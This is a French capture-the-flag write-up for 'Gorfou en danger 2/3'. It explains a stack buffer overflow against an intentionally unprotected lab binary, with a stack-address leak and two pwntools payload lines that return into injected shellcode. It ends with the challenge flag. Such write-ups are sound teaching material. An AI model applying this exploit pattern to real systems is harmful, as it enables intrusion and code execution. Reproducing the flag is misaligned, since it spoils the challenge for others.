# Writeup pour `Gorfou en danger 2/3`

Auteur : *Pwnsard*  
Difficulté : *Introductif*

### Notions prérequises :
- Fonctionnement d'une stackframe
- Buffer overflow
- Shellcode
- Protections de base

### Protections :

```
checksec --file=chall      
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   RUNPATH     43 Symbols	  No	0		2		chall
```

### Principe

Il s'agit d'un buffer overflow basique pour faire un **`ret2shellcode`** sur un buffer de la stack. Cela est possible car le contenu de la stack est executable en tant que code machine (en pratique la stack n'est jamais exécutable, il s'agit d'un challenge introductif).

Dans cette partie du code, il y a un overflow evident de 0x30 bytes :

```C
char command[0x100]; 
printf("> ");
read(0, command, 0x130);
```

Contrairement au challenge précédent, il n'y a pas de fonction qui ouvre directement un shell. Il faut donc amener nous même le code machine malveillant (ce que l'on appelle un shellcode) grâce à la zone mémoire que nous contrôlons, à savoir le buffer `command`.

On a le contrôle du flow d'exécution (il n'y a même pas besoin de leaker un canary), il nous suffit désormais de connaître l'adresse de notre buffer pour aller éxecuter notre code. Il y a une fonction qui permet de trouver très facilement un leak de la stack.

```C
void debug_info(void) { 
    // our very own "info proc map"
    printf("main address : %p\n", &main);
    printf("printf address : %p\n", *(uint64_t *)0x403008);
    void* local_var = NULL;
    printf("Stack address : %p\n", &local_var);
    return;
}
```

En envoyant le payload
```python
r.send(b"A" * (0x100 + 8) + p64(exe.symbols['debug_info']) + p64(exe.symbols['take_command']))
```
on réécrit le saved rip avec l'adresse de debug_info, qui nous affiche les adresses. Puis une fois debug_info exécutée, on retourne dans `take_command`, pour exécuter un dernier payload allant exécuter notre shellcode. (Sachant qu'on trouve avec gdb que le shellcode se trouve à une adresse éloignée de 0xf0 de celle leakée) 

```python
r.send(shellcode + (b"\x90" * ((0x108) - len(shellcode))) + p64(leak - 0xf0))
```

### Script de résolution :

Voir `solve.py`

### Flag : 

`404CTF{c3cI_E5T_mA_574ti0n_QUe_voU5_voyE2,_D3rr1Èr3,_lÀ._Pa5_M@L,_nOn_?}`